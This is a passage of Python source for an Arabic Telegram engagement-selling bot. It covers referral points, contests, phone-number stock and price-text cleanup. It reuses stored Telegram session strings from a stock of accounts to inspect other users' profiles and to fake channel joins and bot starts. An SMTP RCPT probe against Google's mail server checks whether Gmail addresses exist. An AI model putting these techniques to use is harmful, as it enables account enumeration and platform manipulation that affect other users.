              c.execute("ALTER TABLE services ADD COLUMN IF NOT EXISTS service_type TEXT DEFAULT 'smm'")
      except Exception: pass
      try:
          with db_conn() as c:
              if not c.execute("SELECT id FROM services WHERE service_type='mandatory_sub' LIMIT 1").fetchone():
                  c.execute(
                      "INSERT INTO services (category,api_service_id,panel,platform,name_ar,description,min_qty,max_qty,price_per_point,active,service_type) VALUES (%s,%s,%s,%s,%s,%s,%s,%s,%s,%s,%s)",
                      ('start_bot',0,0,'tg','🔑 الاشتراك الإجباري','حسابات المخزون تنضم لقنواتك ثم تضغط ستارت',1,9999,0,1,'mandatory_sub')
                  )
      except Exception as _e: logger.warning(f'mansub seed: {_e}')
      try:
          with db_conn() as c:
              c.execute("ALTER TABLE referral_tasks ADD COLUMN IF NOT EXISTS mandatory_channels TEXT DEFAULT ''")
              c.execute("ALTER TABLE referral_tasks ADD COLUMN IF NOT EXISTS folder_link TEXT DEFAULT ''")
      except Exception:
          pass

      try:
          with db_conn() as c:
              c.execute(
                  "UPDATE menu_items SET label=%s WHERE action_type='builtin' AND action_value='cat:start_bot' AND label != %s",
                  ("🤖 رشق بدء (ستارت) بوت", "🤖 رشق بدء (ستارت) بوت")
              )
      except Exception:
          pass
      try:
          with db_conn() as c:
              svcs_with_desc = c.execute(
                  "SELECT id, description, price_per_point FROM services WHERE description IS NOT NULL AND description != ''"
              ).fetchall()
          cleaned = 0
          for s in svcs_with_desc:
              stripped = _strip_price_from_desc(s["description"], float(s["price_per_point"] or 0))
              if stripped != (s["description"] or "").strip():
                  with db_conn() as c:
                      c.execute("UPDATE services SET description=%s WHERE id=%s", (stripped, s["id"]))
                  cleaned += 1
          if cleaned:
              logger.info(f"🧹 تم تنظيف السعر من وصف {cleaned} خدمة تلقائياً.")
      except Exception as e:
          logger.warning(f"⚠️ فشل تنظيف أوصاف الأسعار: {e}")

def _normalize_desc(desc: str) -> str:
    """يُطبّع الاختصارات الشائعة في أوصاف خدمات SMM إلى العربية.
    K → ألف  |  /D → /يوم  |  /H → /ساعة  |  /W → /أسبوع  |  /M → /شهر
    كما يُصحّح 'كيلوجرام' و'كيلو' المكتوبة بدلاً من 'ألف' خطأً."""
    if not desc:
        return desc

    t = desc

    t = re.sub(r"كيلو\s*جرام", "ألف", t)
    t = re.sub(r"كيلوجرام",     "ألف", t)
    t = re.sub(r"\bكيلو\b",     "ألف", t)

    t = re.sub(r"/\s*(?:day|daily)\b",   "/يوم",    t, flags=re.IGNORECASE)
    t = re.sub(r"/\s*D\b",               "/يوم",    t, flags=re.IGNORECASE)
    t = re.sub(r"\bper\s+day\b",         "يومياً",  t, flags=re.IGNORECASE)

    t = re.sub(r"/\s*(?:hour|hr)\b",     "/ساعة",   t, flags=re.IGNORECASE)
    t = re.sub(r"/\s*H\b",               "/ساعة",   t, flags=re.IGNORECASE)
    t = re.sub(r"\bper\s+hour\b",        "بالساعة", t, flags=re.IGNORECASE)

    t = re.sub(r"/\s*(?:week|wk)\b",     "/أسبوع",  t, flags=re.IGNORECASE)
    t = re.sub(r"/\s*W\b",               "/أسبوع",  t, flags=re.IGNORECASE)

    t = re.sub(r"/\s*(?:month|mo)\b",    "/شهر",    t, flags=re.IGNORECASE)
    t = re.sub(r"/\s*M\b",               "/شهر",    t, flags=re.IGNORECASE)

    t = re.sub(r"(\d)\s*[Kk]\b", r"\1 ألف", t)   # 5K → 5 ألف
    t = re.sub(r"\b[Kk]\b",      "ألف",     t)   # K وحيدة → ألف

    return t.strip()

def _strip_price_from_desc(desc: str, price_per_point: float = 0.0) -> str | None:
    """يُطبّع الاختصارات أولاً ثم يحذف جزء السعر فقط، ويُبقي باقي النص.
    يعيد None إذا لم يتبق شيء بعد الحذف."""
    if not desc:
        return None

    text = _normalize_desc(desc)   # K→ألف، /D→/يوم، كيلوجرام→ألف … أولاً

    text = re.sub(r"\$\s*\d+(?:[.,]\d+)?(?:\s*/\s*\d+)?", "", text, flags=re.IGNORECASE)
    text = re.sub(r"\d+(?:[.,]\d+)?\s*\$", "", text)
    text = re.sub(r"USD\s*\d+(?:[.,]\d+)?", "", text, flags=re.IGNORECASE)
    text = re.sub(r"\d+(?:[.,]\d+)?\s*USD", "", text, flags=re.IGNORECASE)

    if price_per_point and price_per_point > 0:
        panel_price = price_per_point / 100_000
        def _remove_price_num(m):
            val = float(m.group(0).replace(",", "."))
            if val > 0 and abs(val - panel_price) / panel_price <= 0.5:
                return ""
            return m.group(0)
        text = re.sub(r"\d+(?:[.,]\d+)?", _remove_price_num, text)

    text = re.sub(r"[-|/\\،,;:\s]+$", "", text.strip())
    text = re.sub(r"^[-|/\\،,;:\s]+", "", text.strip())
    text = re.sub(r"\s{2,}", " ", text).strip()

    return text if text else None

def _desc_has_price(desc: str, price_per_point: float = 0.0) -> bool:
    if not desc:
        return False
    stripped = _strip_price_from_desc(desc, price_per_point)
    return stripped != desc.strip()

def get_setting(key: str) -> str:
    with db_conn() as c:
        row = c.execute("SELECT value FROM settings WHERE key=?", (key,)).fetchone()
        return row["value"] if row else ""

def _do_set_setting(key: str, value: str):
    with db_conn() as c:
        c.execute("INSERT INTO settings (key, value) VALUES (%s, %s) ON CONFLICT (key) DO UPDATE SET value=EXCLUDED.value", (key, value))

def set_setting(key: str, value: str):
    """حفظ إعداد مع إعادة محاولة تلقائية عند انقطاع الاتصال"""
    with_db_retry(_do_set_setting, key, value)

THANK_OWNER_SETTINGS = {
    "thank_owner_button_label": ("نص زر «شكر المالك»", "💌 شكر المالك"),
    "thank_owner_ar_button_label": ("نص زر الرسالة العربية", "🇸🇦 رسالة بالعربية"),
    "thank_owner_en_button_label": ("نص زر الرسالة الإنجليزية", "🇬🇧 Message in English"),
    "thank_owner_photo_button_label": ("نص زر إرسال الصورة", "🖼️ إرسال صورة"),
    "thank_owner_ar_prompt": ("رسالة طلب النص العربي", "💌 أرسل رسالة الشكر بالعربية:"),
    "thank_owner_en_prompt": ("رسالة طلب النص الإنجليزي", "💌 Send your thank-you message in English:"),
    "thank_owner_photo_prompt": ("رسالة طلب الصورة", "🖼️ أرسل الصورة التي تريد مشاركتها مع المالك:"),
    "thank_owner_success_message": ("رسالة نجاح الإرسال", "✅ تم إرسال شكرك إلى المالك، شكراً لك!"),
}

def is_maintenance_on() -> bool:
    return int(get_setting("maintenance_mode") or "0") == 1

def is_number_exchange_on() -> bool:
    return int(get_setting("number_exchange_enabled") or "0") == 1

MAINTENANCE_MESSAGE = (
    "🛠 *البوت في وضع الصيانة حالياً*\n\n"
    "نعمل على تحسين تجربتك، ونعتذر عن أي إزعاج.\n"
    "سيعود البوت للعمل خلال وقت قصير — شكراً لتفهّمك 💙"
)

def get_or_create_user(user_id: int, username: str, full_name: str, invited_by: int = 0) -> dict:
    with db_conn() as c:
        row = c.execute("SELECT * FROM users WHERE user_id=?", (user_id,)).fetchone()
        if row:
            c.execute("UPDATE users SET username=?, full_name=? WHERE user_id=?",
                      (username, full_name, user_id))
            return dict(row)
        num_row = c.execute(
            "UPDATE settings SET value=(value::int+1)::text WHERE key='total_bot_users' RETURNING value::int AS total"
        ).fetchone()
        total = num_row["total"] if num_row else 1
        c.execute(
            "INSERT INTO users (user_id, username, full_name, invited_by, bot_user_num, verified) VALUES (%s,%s,%s,%s,%s,0)",
            (user_id, username, full_name, invited_by, total)
        )
        return dict(c.execute("SELECT * FROM users WHERE user_id=%s", (user_id,)).fetchone())

def set_user_verified(user_id: int):
    with db_conn() as c:
        c.execute("UPDATE users SET verified=1 WHERE user_id=?", (user_id,))

def credit_referral_if_pending(user_id: int, context=None):
    """يمنح نقاط الإحالة للداعي مرة واحدة فقط، بعد اشتراك المدعو بالقنوات الإجبارية واجتيازه التحقق.
    يُعيد (inviter_id, points) عند المنح، أو None إن لم يكن هناك شيء لمنحه."""
    with db_conn() as c:
        row = c.execute(
            "SELECT invited_by, referral_credited FROM users WHERE user_id=%s", (user_id,)
        ).fetchone()
        if not row:
            return None
        invited_by = row["invited_by"]
        already = row["referral_credited"]
        if not invited_by or invited_by == 0 or invited_by == user_id or already:
            return None
        rp = int(get_setting("referral_points") or "30")
        c.execute(
            "UPDATE users SET referral_credited=1, credited_at=NOW() WHERE user_id=%s AND referral_credited=0",
            (user_id,)
        )
        if c.rowcount == 0:
            return None
        c.execute("UPDATE users SET points=points+%s WHERE user_id=%s", (rp, invited_by))
    import asyncio as _aio
    _bot_ref = getattr(context, 'bot', None) if context else None
    if _bot_ref and NUMBERS_GROUP_ID:
        _inviter_row  = get_user(invited_by) or {}
        _invited_row  = get_user(user_id)    or {}
        _inviter_name = md_escape(_inviter_row.get('full_name') or f"ID:{invited_by}")
        _inviter_un   = f" (@{md_escape(_inviter_row['username'])})" if _inviter_row.get('username') else ''
        _invited_name = md_escape(_invited_row.get('full_name')  or f"ID:{user_id}")
        _invited_un   = f" (@{md_escape(_invited_row['username'])})"  if _invited_row.get('username')  else ''
        with db_conn() as _rc:
            _total_ref = (_rc.execute(
                "SELECT COUNT(*) AS cnt FROM users WHERE invited_by=%s AND referral_credited=1",
                (invited_by,)
            ).fetchone() or {}).get("cnt", 1)
        _ref_notif = (
            f"🤝 *إحالة جديدة ناجحة!*\n\n"
            f"👤 *المُحيل:* {_inviter_name}{_inviter_un} (`{invited_by}`)\n"
            f"🆕 *المدعو:* {_invited_name}{_invited_un} (`{user_id}`)\n"
            f"💰 *النقاط الممنوحة:* {rp} نقطة\n"
            f"📊 *إجمالي إحالات المُحيل:* {_total_ref}"
        )
        try:
            _aio.ensure_future(_bot_ref.send_message(NUMBERS_GROUP_ID, _ref_notif, parse_mode='Markdown'))
        except Exception:
            pass

    import time as _time_mod
    _now_ts = _time_mod.time()
    _bucket = _referral_rate_tracker.setdefault(invited_by, [])
    _bucket.append(_now_ts)
    _referral_rate_tracker[invited_by] = [t for t in _bucket if _now_ts - t <= 300]
    if len(_referral_rate_tracker[invited_by]) >= 5 and context is not None:
        with db_conn() as _rc:
            _rc.execute("UPDATE users SET referral_points_blocked=1 WHERE user_id=%s", (invited_by,))
        _referral_rate_tracker.pop(invited_by, None)
        _bot2 = getattr(context, 'bot', None)
        if _bot2 and OWNER_ID:
            _rq = get_user(invited_by) or {}
            _rq_name = _rq.get('full_name') or f"ID:{invited_by}"
            _rq_un = (f" (@{_rq['username']})" if _rq.get('username') else '')
            _fraud_text = (
                f"⚠️ *تنبيه: رشق إحالات محتمل!*\n\n"
                f"👤 المُحيل: {_rq_name}{_rq_un} (`{invited_by}`)\n"
                f"📊 تلقّى 5+ إحالات في أقل من 5 دقائق\n"
                f"💰 نقاط آخر إحالة: {rp} نقطة\n"
                f"🔒 تم تقييده تلقائياً\n\n"
                f"اختر الإجراء:"
            )
            _fraud_kb = InlineKeyboardMarkup([
                [InlineKeyboardButton("✅ إبقاء + رفع التقييد",   callback_data=f"os:ref_keep:{invited_by}:{rp}")],
                [InlineKeyboardButton("❌ خصم الإحالة + رفع التقييد", callback_data=f"os:ref_deduct:{invited_by}:{rp}")],
                [InlineKeyboardButton("➕ خصم نقاط إضافية",               callback_data=f"os:ref_extra:{invited_by}:{rp}")],
                [InlineKeyboardButton("🔓 رفع التقييد فقط",            callback_data=f"os:ref_unblock:{invited_by}")],
            ])
            try:
                _aio.ensure_future(_bot2.send_message(OWNER_ID, _fraud_text, parse_mode='Markdown', reply_markup=_fraud_kb))
            except Exception:
                pass
    return (invited_by, rp)

def _referral_counter_reset_at():
    """يُرجع لحظة آخر تصفير للعداد (UTC) إن وُجدت، وإلا None."""
    raw = get_setting("referral_counter_reset_at")
    if not raw:
        return None
    try:
        dt = datetime.fromisoformat(raw)
        if dt.tzinfo is None:
            dt = dt.replace(tzinfo=timezone.utc)
        return dt
    except Exception:
        return None

def reset_referral_counter():
    """يصفّر عداد 'الأكثر إرسالاً لرابط الدعوة' من الآن، دون المساس بنقاط
    الأعضاء أو حالة الدعوات الفعلية — فقط يستثني ما قبل هذه اللحظة من العدّ."""
    set_setting("referral_counter_reset_at", datetime.now(timezone.utc).isoformat())

def _referral_period_bounds(period: str):
    """يُرجع (since_utc, عنوان الفترة) لفترة زمنية معيّنة، محسوبة بالتوقيت العالمي (UTC)،
    مع مراعاة آخر عملية تصفير للعداد إن وُجدت (يُؤخذ الأحدث بين الاثنين)."""
    now = datetime.now(timezone.utc)
    if period == "24h":
        since, title = now - timedelta(hours=24), "آخر 24 ساعة"
    elif period == "day":
        since, title = now.replace(hour=0, minute=0, second=0, microsecond=0), "اليوم (منذ 00:00 بالتوقيت العالمي)"
    elif period == "week":
        since, title = now - timedelta(days=7), "آخر أسبوع"
    elif period == "month":
        since, title = now - timedelta(days=30), "آخر شهر"
    else:
        since, title = None, "كل الأوقات"
    reset_at = _referral_counter_reset_at()
    if reset_at is not None and (since is None or reset_at > since):
        since = reset_at
    return since, title

def get_top_referrers_since(since_dt, limit: int = 10):
    """يُرجع قائمة أكثر الأعضاء إرسالاً لرابط الدعوة (دعوات مكتملة/معتمدة فقط)
    منذ لحظة زمنية محدّدة (UTC)، أو لكل الأوقات إن كانت since_dt=None."""
    with db_conn() as c:
        if since_dt is None:
            rows = c.execute(
                "SELECT invited_by, COUNT(*) as cnt FROM users "
                "WHERE invited_by IS NOT NULL AND invited_by != 0 AND referral_credited=1 "
                "GROUP BY invited_by ORDER BY cnt DESC LIMIT %s",
                (limit,)
            ).fetchall()
        else:
            rows = c.execute(
                "SELECT invited_by, COUNT(*) as cnt FROM users "
                "WHERE invited_by IS NOT NULL AND invited_by != 0 AND referral_credited=1 "
                "AND credited_at IS NOT NULL AND credited_at >= %s "
                "GROUP BY invited_by ORDER BY cnt DESC LIMIT %s",
                (since_dt, limit)
            ).fetchall()
    return rows

def _format_top_referrers(rows, title: str) -> str:
    lines = [f"🏆 *الأكثر إرسالاً لرابط الدعوة — {title}:*\n"]
    if not rows:
        lines.append("لا توجد دعوات مكتملة خلال هذه الفترة.")
        return "\n".join(lines)
    inviter_ids = [r["invited_by"] for r in rows]
    inviters_map = {}
    if inviter_ids:
        placeholders = ",".join(["%s"] * len(inviter_ids))
        with db_conn() as _c:
            _batch = _c.execute(
                f"SELECT user_id, username, full_name FROM users WHERE user_id IN ({placeholders})",
                tuple(inviter_ids)
            ).fetchall()
        for u in _batch:
            inviters_map[u["user_id"]] = u
    for i, r in enumerate(rows, start=1):
        inviter = inviters_map.get(r["invited_by"])
        if inviter and inviter.get("username"):
            name = md_escape(f"@{inviter['username']}")
        elif inviter and inviter.get("full_name"):
            name = md_escape(inviter["full_name"])
        else:
            name = f"ID {r['invited_by']}"
        lines.append(f"{i}. {name} — {r['cnt']} دعوة")
    return "\n".join(lines)

# ────────────────────────────────────────────────────────────
# ────────────────────────────────────────────────────────────

def get_referral_contest() -> dict:
    """يُرجع معلومات المسابقة الحالية من قاعدة الإعدادات."""
    ctype     = get_setting("referral_contest_type")  or "none"
    start_raw = get_setting("referral_contest_start") or ""
    end_raw   = get_setting("referral_contest_end")   or ""
    start_dt = end_dt = None
    try:
        if start_raw:
            start_dt = datetime.fromisoformat(start_raw)
            if start_dt.tzinfo is None:
                start_dt = start_dt.replace(tzinfo=timezone.utc)
    except Exception:
        pass
    try:
        if end_raw:
            end_dt = datetime.fromisoformat(end_raw)
            if end_dt.tzinfo is None:
                end_dt = end_dt.replace(tzinfo=timezone.utc)
    except Exception:
        pass
    return {"type": ctype, "start": start_dt, "end": end_dt}

def _parse_contest_duration(text: str):
    """يُحوّل نصاً مثل 7s / 7m / 7h / 7d إلى timedelta، أو None إن كانت الصيغة خاطئة."""
    m = re.match(r"^(\d+)([smhd])$", text.strip().lower())
    if not m:
        return None
    val, unit = int(m.group(1)), m.group(2)
    if unit == "s": return timedelta(seconds=val)
    if unit == "m": return timedelta(minutes=val)
    if unit == "h": return timedelta(hours=val)
    if unit == "d": return timedelta(days=val)
    return None

def _format_contest_time_remaining(end_dt) -> str:
    """يُرجع نص الوقت المتبقي بصيغة مقروءة بالعربية."""
    now = datetime.now(timezone.utc)
    if end_dt is None or end_dt <= now:
        return "انتهت المسابقة"
    total_seconds = int((end_dt - now).total_seconds())
    days    = total_seconds // 86400
    hours   = (total_seconds % 86400) // 3600
    minutes = (total_seconds % 3600)  // 60
    seconds = total_seconds % 60
    parts = []
    if days:              parts.append(f"{days} يوم")
    if hours:             parts.append(f"{hours} ساعة")
    if minutes:           parts.append(f"{minutes} دقيقة")
    if seconds and not days: parts.append(f"{seconds} ثانية")
    return " و ".join(parts) if parts else "أقل من ثانية"

def add_numbers_to_stock(numbers: list) -> int:
    """يضيف أرقاماً جديدة لمخزون أرقام تيلغرام (يتجاهل المكرر). يُرجع عدد الأرقام المضافة فعلياً."""
    added = 0
    with db_conn() as c:
        for n in numbers:
            n = n.strip()
            if not n:
                continue
            try:
                c.execute(
                    "INSERT INTO number_stock (phone_number) VALUES (%s) ON CONFLICT (phone_number) DO NOTHING",
                    (n,)
                )
                if c.rowcount:
                    added += 1
            except Exception:
                pass
    return added

COUNTRY_CODES = {
    "1": "🇺🇸 أمريكا/كندا", "7": "🇷🇺 روسيا", "20": "🇪🇬 مصر", "27": "🇿🇦 جنوب أفريقيا",
    "30": "🇬🇷 اليونان", "31": "🇳🇱 هولندا", "32": "🇧🇪 بلجيكا", "33": "🇫🇷 فرنسا",
    "34": "🇪🇸 إسبانيا", "36": "🇭🇺 المجر", "39": "🇮🇹 إيطاليا", "40": "🇷🇴 رومانيا",
    "44": "🇬🇧 بريطانيا", "45": "🇩🇰 الدنمارك", "46": "🇸🇪 السويد", "48": "🇵🇱 بولندا",
    "49": "🇩🇪 ألمانيا", "51": "🇵🇪 بيرو", "52": "🇲🇽 المكسيك", "54": "🇦🇷 الأرجنتين",
    "55": "🇧🇷 البرازيل", "56": "🇨🇱 تشيلي", "60": "🇲🇾 ماليزيا", "62": "🇮🇩 إندونيسيا",
    "63": "🇵🇭 الفلبين", "64": "🇳🇿 نيوزيلندا", "65": "🇸🇬 سنغافورة", "66": "🇹🇭 تايلاند",
    "81": "🇯🇵 اليابان", "82": "🇰🇷 كوريا الجنوبية", "84": "🇻🇳 فيتنام", "86": "🇨🇳 الصين",
    "90": "🇹🇷 تركيا", "91": "🇮🇳 الهند", "92": "🇵🇰 باكستان", "93": "🇦🇫 أفغانستان",
    "94": "🇱🇰 سريلانكا", "95": "🇲🇲 ميانمار", "98": "🇮🇷 إيران",
    "212": "🇲🇦 المغرب", "213": "🇩🇿 الجزائر", "216": "🇹🇳 تونس", "218": "🇱🇾 ليبيا",
    "220": "🇬🇲 غامبيا", "221": "🇸🇳 السنغال", "234": "🇳🇬 نيجيريا", "249": "🇸🇩 السودان",
    "251": "🇪🇹 إثيوبيا", "254": "🇰🇪 كينيا", "255": "🇹🇿 تنزانيا", "256": "🇺🇬 أوغندا",
    "260": "🇿🇲 زامبيا", "351": "🇵🇹 البرتغال", "355": "🇦🇱 ألبانيا", "358": "🇫🇮 فنلندا",
    "370": "🇱🇹 ليتوانيا", "371": "🇱🇻 لاتفيا", "372": "🇪🇪 إستونيا", "373": "🇲🇩 مولدوفا",
    "374": "🇦🇲 أرمينيا", "375": "🇧🇾 بيلاروسيا", "376": "🇦🇩 أندورا", "380": "🇺🇦 أوكرانيا",
    "381": "🇷🇸 صربيا", "385": "🇭🇷 كرواتيا", "386": "🇸🇮 سلوفينيا", "420": "🇨🇿 التشيك",
    "421": "🇸🇰 سلوفاكيا", "212": "🇲🇦 المغرب",
    "852": "🇭🇰 هونغ كونغ", "855": "🇰🇭 كمبوديا", "880": "🇧🇩 بنغلاديش", "886": "🇹🇼 تايوان",
    "960": "🇲🇻 المالديف", "961": "🇱🇧 لبنان", "962": "🇯🇴 الأردن", "963": "🇸🇾 سوريا",
    "964": "🇮🇶 العراق", "965": "🇰🇼 الكويت", "966": "🇸🇦 السعودية", "967": "🇾🇪 اليمن",
    "968": "🇴🇲 عمان", "970": "🇵🇸 فلسطين", "971": "🇦🇪 الإمارات", "972": "🇮🇱 إسرائيل",
    "973": "🇧🇭 البحرين", "974": "🇶🇦 قطر", "975": "🇧🇹 بوتان", "976": "🇲🇳 منغوليا",
    "992": "🇹🇯 طاجيكستان", "993": "🇹🇲 تركمانستان", "994": "🇦🇿 أذربيجان", "995": "🇬🇪 جورجيا",
    "996": "🇰🇬 قيرغيزستان", "998": "🇺🇿 أوزبكستان",
}
_COUNTRY_PREFIXES_SORTED = sorted(COUNTRY_CODES.keys(), key=len, reverse=True)

# ────────────────────────────────────────────────────────────
# تصنيف أرقام الهواتف: عربي آسيوي / عربي أفريقي / أخرى
# ────────────────────────────────────────────────────────────
# الدول العربية الآسيوية — تُقبل الإحالة فوراً
ARAB_ASIAN_PREFIXES = {
    "966",  # 🇸🇦 السعودية
    "971",  # 🇦🇪 الإمارات
    "965",  # 🇰🇼 الكويت
    "974",  # 🇶🇦 قطر
    "973",  # 🇧🇭 البحرين
    "968",  # 🇴🇲 عمان
    "962",  # 🇯🇴 الأردن
    "964",  # 🇮🇶 العراق
    "963",  # 🇸🇾 سوريا
    "961",  # 🇱🇧 لبنان
    "970",  # 🇵🇸 فلسطين
    "967",  # 🇾🇲 اليمن
}

# الدول العربية الأفريقية — تخضع لفحص جودة الحساب
ARAB_AFRICAN_PREFIXES = {
    "20",   # 🇪🇬 مصر
    "218",  # 🇱🇾 ليبيا
    "216",  # 🇹🇳 تونس
    "213",  # 🇩🇿 الجزائر
    "212",  # 🇲🇦 المغرب
    "249",  # 🇸🇩 السودان
    "222",  # 🇲🇷 موريتانيا
    "252",  # 🇸🇴 الصومال
    "253",  # 🇩🇯 جيبوتي
    "269",  # 🇰🇲 جزر القمر
}

def classify_phone_region(phone: str) -> str:
    """
    يصنّف رقم الهاتف إلى:
    - 'arab_asian'  : دول عربية آسيوية  → قبول فوري
    - 'arab_african': دول عربية أفريقية → يخضع لفحص الجودة
    - 'other'       : دول غير عربية     → لا تُحتسب الإحالة
    """
    digits = phone.lstrip("+").strip()
    # ننظر في مفاتيح أطول أولاً لتجنب التعارض (مثل 20 و 212)
    all_arab = ARAB_AFRICAN_PREFIXES | ARAB_ASIAN_PREFIXES
    for prefix in sorted(all_arab, key=len, reverse=True):
        if digits.startswith(prefix):
            return "arab_asian" if prefix in ARAB_ASIAN_PREFIXES else "arab_african"
    return "other"

async def _check_user_quality_via_telethon(user_id: int) -> dict:
    """
    يستخدم Telethon بجلسة من المخزون للتحقق من:
      - has_stories  : لديه قصص (ستوري)
      - has_gifts    : لديه هدايا نجوم
      - has_premium  : حساب برميوم (من Telethon)
      - has_rating   : لديه تقييم (بروفايل أعمال)
    """
    result = {
        "has_stories": False,
        "has_gifts":   False,
        "has_premium": False,
        "has_rating":  False,
    }
    if not TELEGRAM_API_ID or not TELEGRAM_API_HASH:
        return result

    with db_conn() as c:
        row = c.execute(
            "SELECT session_string FROM number_stock "
            "WHERE session_string IS NOT NULL AND deleted_at IS NULL AND frozen_at IS NULL "
            "ORDER BY RANDOM() LIMIT 1"
        ).fetchone()
    if not row:
        return result

    raw_sess = row["session_string"]
    client = None
    try:
        api_id   = int(TELEGRAM_API_ID)
        api_hash = TELEGRAM_API_HASH
        client = TelegramClient(
            StringSession(_maybe_convert_session(raw_sess)),
            api_id, api_hash
        )
        await client.connect()
        if not await client.is_user_authorized():
            return result

        from telethon.tl.functions.users import GetFullUserRequest as _GetFull
        full = await client(_GetFull(user_id))

        # برميوم
        if getattr(full.user, 'premium', False):
            result["has_premium"] = True

        # هدايا النجوم
        gifts_count = getattr(full.full_user, 'stargifts_count', 0) or 0
        if gifts_count > 0:
            result["has_gifts"] = True

        # تقييم / بروفايل أعمال
        if (getattr(full.full_user, 'business_location', None) or
                getattr(full.full_user, 'business_work_hours', None) or
                getattr(full.full_user, 'business_intro', None) or
                getattr(full.full_user, 'business_greeting_message', None) or
                getattr(full.full_user, 'business_away_message', None)):
            result["has_rating"] = True

        # ستوري
        try:
            from telethon.tl.functions.stories import GetPeerStoriesRequest as _GPS
            s_res = await client(_GPS(peer=user_id))
            if s_res and getattr(s_res, 'stories', None) and len(s_res.stories.stories) > 0:
                result["has_stories"] = True
        except Exception:
            pass

    except Exception as _te:
        logger.warning(f"⚠️ Telethon quality check for {user_id}: {_te}")
    finally:
        if client:
            try:
                await client.disconnect()
            except Exception:
                pass
    return result

async def check_arab_african_account_quality(user_id: int, user, context) -> dict:
    """
    يفحص جودة الحساب العربي الأفريقي.
    يُرجع dict فيه:
      - 'passed'  : True إذا اجتاز أي معيار
      - 'details' : وصف نصي للنتائج
    """
    checks = {}

    # ① برميوم (متاح مباشرةً من كائن المستخدم)
    checks["premium"] = bool(getattr(user, 'is_premium', False))

    # ② عمر الحساب أكثر من سنة (تقدير من رقم ID)
    age_year_str = estimate_registration_year(user_id)
    try:
        # التاريخ الحالي ثابت على 2026 — سنة 2024 وما قبل = أكثر من سنة
        age_year = int(age_year_str.split()[0])
        checks["old_account"] = (age_year <= 2024)
    except Exception:
        checks["old_account"] = False

    # ③ فحوصات Telethon (ستوري، هدايا، تقييم)
    tl_result = await _check_user_quality_via_telethon(user_id)
    checks["stories"] = tl_result.get("has_stories", False)
    checks["gifts"]   = tl_result.get("has_gifts",   False)
    checks["premium"] = checks["premium"] or tl_result.get("has_premium", False)
    checks["rating"]  = tl_result.get("has_rating",  False)

    passed = any(checks.values())
    labels = {
        "premium":     "✅ حساب برميوم"     if checks["premium"]     else "❌ لا برميوم",
        "stories":     "✅ لديه ستوري"       if checks["stories"]     else "❌ لا ستوري",
        "gifts":       "✅ لديه هدايا"       if checks["gifts"]       else "❌ لا هدايا",
        "rating":      "✅ لديه تقييم"       if checks["rating"]      else "❌ لا تقييم",
        "old_account": "✅ حساب أقدم من سنة" if checks["old_account"] else "❌ حساب جديد",
    }
    details = " | ".join(labels.values())
    return {"passed": passed, "details": details, "checks": checks}

async def ask_for_phone_share(update: Update, context: ContextTypes.DEFAULT_TYPE, edit: bool = False):
    """
    يطلب من المستخدم مشاركة رقم هاتفه إذا كان لديه إحالة معلّقة.
    إذا لم تكن هناك إحالة معلّقة ينتقل مباشرةً لإنهاء التحقق.
    """
    user = update.effective_user
    db_user = get_user(user.id)

    # لا يوجد محيل → تخطّ خطوة الرقم واذهب مباشرةً للقائمة
    invited_by_id = (db_user or {}).get("invited_by", 0) or 0
    already_credited = bool((db_user or {}).get("referral_credited", 0))
    if not invited_by_id or already_credited:
        await finalize_verification(update, context, user, edit=edit)
        return

    context.user_data["state"] = "await_phone_share"
    kb = ReplyKeyboardMarkup(
        [[KeyboardButton("📱 مشاركة رقم هاتفي", request_contact=True)]],
        one_time_keyboard=True,
        resize_keyboard=True,
    )
    text = (
        "📱 *خطوة أخيرة — مشاركة رقم الهاتف*\n\n"
        "دخلت عبر رابط دعوة صديق، ولإتمام التحقق من الإحالة "
        "يرجى مشاركة رقم هاتفك بالضغط على الزر أدناه.\n\n"
        "⚠️ يمكنك استخدام البوت بغض النظر عن نتيجة التحقق."
    )
    if edit and update.callback_query:
        await update.callback_query.edit_message_text(text, parse_mode=ParseMode.MARKDOWN)
        await context.bot.send_message(
            chat_id=user.id, text="👇 اضغط الزر لمشاركة رقمك:", reply_markup=kb
        )
    else:
        await update.message.reply_text(text, parse_mode=ParseMode.MARKDOWN, reply_markup=kb)

def guess_country(phone: str) -> str:
    """يحاول تحديد الدولة من مقدمة رقم الهاتف الدولي (+964...)."""
    digits = phone.lstrip("+").strip()
    for prefix in _COUNTRY_PREFIXES_SORTED:
        if digits.startswith(prefix):
            return COUNTRY_CODES[prefix]
    return "🌍 غير معروفة"

def _smtp_verify_gmail(email: str) -> tuple[bool | None, str]:
    """
    يتحقق من وجود حساب Gmail عبر SMTP handshake مع خوادم Google.
    يُرجع (True, "") إن وُجد الإيميل،
             (False, سبب) إن لم يوجد،
             (None, سبب) إن تعذّر الاتصال بالخوادم.
    هذه الدالة blocking — نفّذها دائماً عبر run_in_executor.
    """
    import smtplib, socket as _sock, re as _re
    _email = email.strip().lower()
    # تحقق أساسي من الصيغة
    if not _re.match(r"^[^@\s]+@gmail\.com$", _email):
        return False, "الإيميل ليس من نطاق @gmail.com"
    mx_host = "aspmx.l.google.com"
    helo    = "verify.bot"
    sender  = "verify@verify.bot"
    try:
        smtp = smtplib.SMTP(timeout=12)
        smtp.connect(mx_host, 25)
        smtp.ehlo(helo)
        smtp.mail(sender)
        code, msg = smtp.rcpt(_email)
        smtp.quit()
        msg_str = msg.decode(errors="ignore") if isinstance(msg, bytes) else str(msg)
        if code == 250:
            return True, ""
        elif code in (550, 551, 553):
            return False, msg_str[:120]
        else:
            # كود غير متوقع — نتجاهل ولا نرفض
            return None, f"كود غير متوقع: {code}"
    except _sock.timeout:
        return None, "انتهت مهلة الاتصال بخوادم Google"
    except _sock.gaierror:
        return None, "تعذّر الوصول لخوادم Google (DNS)"
    except smtplib.SMTPException as _se:
        return None, str(_se)[:120]
    except Exception as _e:
        return None, str(_e)[:120]

_ID_AGE_TABLE = [
    (100_000_000, "2013 أو قبل"),
    (200_000_000, "2014"),
    (300_000_000, "2015"),
    (400_000_000, "2016"),
    (600_000_000, "2017"),
    (900_000_000, "2018"),
    (1_100_000_000, "2019"),
    (1_400_000_000, "2020"),
    (1_700_000_000, "2021"),
    (2_000_000_000, "2022"),
    (5_000_000_000, "2023"),
    (6_500_000_000, "2024"),
    (7_500_000_000, "2025"),
]

def estimate_registration_year(user_id: int) -> str:
    """تقدير تقريبي (غير رسمي) لسنة إنشاء الحساب اعتماداً على رقم الـID، لأن تيليجرام لا يوفر تاريخ إنشاء دقيق."""
    for threshold, year in _ID_AGE_TABLE:
        if user_id < threshold:
            return year
    return "2026 أو أحدث"

def parse_spam_reply(raw_text: str) -> dict:
